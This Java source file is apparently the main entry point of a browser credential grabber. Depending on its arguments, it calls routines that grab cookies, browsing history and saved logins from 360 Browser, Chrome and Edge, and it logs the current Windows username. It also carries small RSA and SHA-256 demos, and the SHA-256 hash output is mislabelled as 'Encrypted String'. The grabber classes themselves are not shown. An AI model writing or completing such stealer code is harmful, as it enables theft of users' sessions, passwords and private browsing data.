package ninja.maki;

import ninja.maki.grabber.browser360.Browser360Cookie;
import ninja.maki.grabber.browser360.Browser360History;
import ninja.maki.grabber.browser360.Browser360Login;
import ninja.maki.grabber.chrome.ChromeCookie;
import ninja.maki.grabber.chrome.ChromeHistory;
import ninja.maki.grabber.chrome.ChromeLogin;
import ninja.maki.grabber.edge.EdgeCookie;
import ninja.maki.grabber.edge.EdgeHistory;
import ninja.maki.grabber.edge.EdgeLogin;
import ninja.maki.utils.Logger;
import ninja.maki.utils.RSAUtil;
import org.apache.commons.codec.digest.DigestUtils;

public class Main {

    public static void main(String[] args) {
        Logger.log("Start Program.", Logger.Type.SUCCESS);
        Logger.log("Current User -> " + System.getenv("USERNAME"), Logger.Type.INFO);

        if(args.length == 0) Logger.log("No arguments. (browser360 / chrome / edge / rsa / sha256)", Logger.Type.ERROR);

        for(String arg : args) {
            if(arg.equalsIgnoreCase("browser360")) {
                Browser360Cookie.grab();
                Browser360History.grab();
                Browser360Login.grab();
            }else if(arg.equalsIgnoreCase("chrome")) {
                ChromeCookie.grab();
                ChromeHistory.grab();
                ChromeLogin.grab();
            }else if(arg.equalsIgnoreCase("edge")) {
                EdgeCookie.grab();
                EdgeHistory.grab();
                EdgeLogin.grab();
            }else if(arg.equalsIgnoreCase("rsa")) {
                Logger.log("RSA", Logger.Type.INFO);
                RSAUtil rsaUtil = new RSAUtil();
                String origin = "Hello World";
                Logger.log("Origin String -> " + origin, Logger.Type.INFO);
                Logger.log("Public Key -> " + rsaUtil.getPublicKey(), Logger.Type.INFO);
                Logger.log("Private Key -> " + rsaUtil.getPrivateKey(), Logger.Type.INFO);
                String encrypted = RSAUtil.encrypt(origin, rsaUtil.getPublicKey());
                Logger.log("Encrypted String -> " + encrypted, Logger.Type.INFO);
                String decrypted = RSAUtil.decrypt(encrypted, rsaUtil.getPrivateKey());
                Logger.log("Decrypted String -> " + decrypted, Logger.Type.INFO);
            }else if(arg.equalsIgnoreCase("sha256")) {
                Logger.log("SHA-256", Logger.Type.INFO);
                String origin = "Hello World";
                Logger.log("Origin String -> " + origin, Logger.Type.INFO);
                String encrypted = DigestUtils.sha256Hex(origin.getBytes());
                Logger.log("Encrypted String -> " + encrypted, Logger.Type.INFO);
            }
        }

        Logger.log("Stop Program.", Logger.Type.SUCCESS);
    }

}
